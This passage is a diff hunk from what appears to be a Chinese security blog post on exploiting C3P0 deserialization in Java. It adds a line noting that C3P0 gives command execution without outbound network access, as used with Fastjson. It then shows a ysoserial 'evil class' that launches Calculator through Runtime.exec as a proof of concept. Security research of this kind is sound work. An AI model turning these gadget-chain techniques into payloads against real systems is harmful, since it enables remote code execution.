@@ -8,6 +8,7 @@
 <li>dbcp没有自动回收空闲连接的功能</li>
 <li>c3p0有自动回收空闲连接功能</li>
 </ul>
+<p>C3p0可以利用在反序列化不出网的情况下进行命令执行。参考最后Hex反序列化的利用方式以及原理。在Fastjson中会被用到</p>
 <h1 id="http-base"><a href="#http-base" class="headerlink" title="http base"></a>http base</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里环境引用ysoserial项目</p>
 <h3 id="恶意类的构建"><a href="#恶意类的构建" class="headerlink" title="恶意类的构建"></a>恶意类的构建</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package ysoserial.EvilClasses;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Calc_mac &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
